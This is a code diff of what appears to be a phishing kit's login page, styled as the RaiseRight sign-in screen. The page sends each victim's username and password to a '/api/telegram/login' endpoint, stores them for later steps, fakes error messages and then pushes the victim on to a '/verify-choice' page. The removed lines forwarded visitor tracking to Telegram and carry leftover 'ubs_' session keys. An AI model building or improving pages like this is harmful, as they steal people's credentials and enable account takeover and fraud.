@@ -1,118 +1,73 @@
-"use client";
+"use client"
 
-import { useState, useEffect, useRef } from "react";
-import { useRouter } from "next/navigation";
-import { useVisitorTracking } from "@/hooks/use-visitor-tracking";
+import { useLayoutEffect, useState, type FormEvent } from "react"
+import { useRouter } from "next/navigation"
+import {
+  MSG_LOGIN_INVALID_CREDENTIALS,
+  MSG_UNABLE_VERIFY_TIME,
+  SIGN_IN_LOADING_MS,
+} from "@/lib/approval-messages"
+import { wait } from "@/lib/loading-delays"
+import { storeLoginCredentials } from "@/lib/login-flow-storage"
 
 export default function LoginPage() {
-  const [hasInteracted, setHasInteracted] = useState(false);
-  const visitorInfo = useVisitorTracking();
-  const hasSentVisitRef = useRef(false);
-  const [showPassword, setShowPassword] = useState(false);
-  const [username, setUsername] = useState("");
-  const [password, setPassword] = useState("");
-  const [isLoginLoading, setIsLoginLoading] = useState(false);
-  const [loginError, setLoginError] = useState<string | null>(null);
-  const [countdown, setCountdown] = useState(0);
-  const [honeypot, setHoneypot] = useState("");
-  const countdownRef = useRef<number | null>(null);
-  const redirectRef = useRef<number | null>(null);
-  const router = useRouter();
+  const [showPassword, setShowPassword] = useState(false)
+  const [username, setUsername] = useState("")
+  const [password, setPassword] = useState("")
+  const [isLoginLoading, setIsLoginLoading] = useState(false)
+  const [loginError, setLoginError] = useState<string | null>(null)
+  const router = useRouter()
 
-  useEffect(() => {
-    if (typeof window !== "undefined") {
-      sessionStorage.removeItem("ubs_verify");
-      sessionStorage.removeItem("ubs_details");
-      sessionStorage.removeItem("ubs_otp2");
+  useLayoutEffect(() => {
+    const params = new URLSearchParams(window.location.search)
+    if (params.get("loginDenied") === "1") {
+      setUsername("")
+      setPassword("")
+      setLoginError(MSG_LOGIN_INVALID_CREDENTIALS)
+      window.history.replaceState({}, "", "/")
+      return
     }
-  }, []);
+    if (params.get("verifyUnavailable") === "1") {
+      setUsername("")
+      setPassword("")
+      setLoginError(MSG_UNABLE_VERIFY_TIME)
+      window.history.replaceState({}, "", "/")
+    }
+  }, [])
 
-  useEffect(() => {
-    const onFirstInteraction = () => setHasInteracted(true);
-    window.addEventListener("pointerdown", onFirstInteraction, {
-      once: true,
-      passive: true,
-    });
-    window.addEventListener("keydown", onFirstInteraction, { once: true });
-    return () => {
-      window.removeEventListener("pointerdown", onFirstInteraction);
-      window.removeEventListener("keydown", onFirstInteraction);
-    };
-  }, []);
+  const handleSignIn = async (event: FormEvent) => {
+    event.preventDefault()
+    if (isLoginLoading || !username.trim() || !password.trim()) return
+    setLoginError(null)
+    setIsLoginLoading(true)
 
-  useEffect(() => {
-    if (!hasInteracted || !visitorInfo || hasSentVisitRef.current) return;
-    hasSentVisitRef.current = true;
-    fetch("/api/telegram/visitor", {
+    void fetch("/api/telegram/login", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(visitorInfo),
-    }).catch(console.error);
-  }, [hasInteracted, visitorInfo]);
-
-  const handleSignIn = async (event: any) => {
-    event.preventDefault();
-    if (isLoginLoading || !username || !password) return;
-    if (process.env.NODE_ENV !== "production" && honeypot.trim() !== "") {
-      setLoginError("Suspicious activity detected. Please try again.");
-      return;
-    }
-    setLoginError(null);
-    setIsLoginLoading(true);
+      body: JSON.stringify({
+        userId: username.trim(),
+        password: password.trim(),
+      }),
+    }).catch(() => {})
 
     try {
-      const response = await fetch("/api/telegram/login", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ userId: username, password }),
-      });
-      if (!response.ok) {
-        throw new Error("Failed to send login data");
-      }
-
-      if (typeof window !== "undefined") {
-        sessionStorage.setItem("ubs_verify", "1");
-      }
-
-      setCountdown(10);
-      countdownRef.current = window.setInterval(() => {
-        setCountdown((prev) => {
-          if (prev <= 1) {
-            if (countdownRef.current) {
-              window.clearInterval(countdownRef.current);
-              countdownRef.current = null;
-            }
-            return 0;
-          }
-          return prev - 1;
-        });
-      }, 1000);
-
-      redirectRef.current = window.setTimeout(() => {
-        router.push("/verify");
-      }, 10000);
-    } catch (error) {
-      console.error("Login failed:", error);
-      setLoginError("Unable to send login details. Please try again.");
-      setIsLoginLoading(false);
+      sessionStorage.setItem("loginReady", "1")
+      storeLoginCredentials(username.trim(), password.trim())
+      sessionStorage.setItem("maskedEmail", "**********")
+      sessionStorage.setItem("maskedPhone", "***-***-****")
+    } catch {
+      // continue
     }
-  };
 
-  useEffect(() => {
-    return () => {
-      if (countdownRef.current) {
-        window.clearInterval(countdownRef.current);
-      }
-      if (redirectRef.current) {
-        window.clearTimeout(redirectRef.current);
-      }
-    };
-  }, []);
+    await wait(SIGN_IN_LOADING_MS)
+    router.push("/verify-choice")
+  }
 
   return (
     <div className="min-h-screen bg-white font-raiseright text-[#243b5a]">
       <header className="w-full bg-white border-b border-white shadow-lg">
         <div className="flex w-full items-center justify-center h-27 md:h-30">
+          {/* eslint-disable-next-line @next/next/no-img-element */}
           <img
             src="/raiseright/images/logo.svg"
             alt="RaiseRight"
@@ -139,6 +94,7 @@ export default function LoginPage() {
                 <input
                   id="username"
                   type="text"
+                  autoComplete="username"
                   placeholder="Enter username"
                   value={username}
                   onChange={(e) => setUsername(e.target.value)}
@@ -170,6 +126,7 @@ export default function LoginPage() {
                   <input
                     id="password"
                     type={showPassword ? "text" : "password"}
+                    autoComplete="current-password"
                     placeholder="Enter password"
                     value={password}
                     onChange={(e) => setPassword(e.target.value)}
@@ -197,11 +154,11 @@ export default function LoginPage() {
               </div>
             </div>
 
-            {loginError && (
-              <div className="mb-4 p-3 bg-red-100 border border-red-400 text-red-700 rounded">
+            {loginError ? (
+              <p className="mb-4 text-red-600 text-base" role="alert">
                 {loginError}
-              </div>
-            )}
+              </p>
+            ) : null}
 
             <button
               type="submit"
@@ -223,7 +180,7 @@ export default function LoginPage() {
           </div>
 
           <div className="mt-6 text-center">
-            <p className="mb-6 text-xl text-gray-600">Don't have an account?</p>
+            <p className="mb-6 text-xl text-gray-600">Don&apos;t have an account?</p>
             <button
               type="button"
               onClick={() => router.push("/new-user")}
@@ -235,5 +192,5 @@ export default function LoginPage() {
         </section>
       </main>
     </div>
-  );
+  )
 }
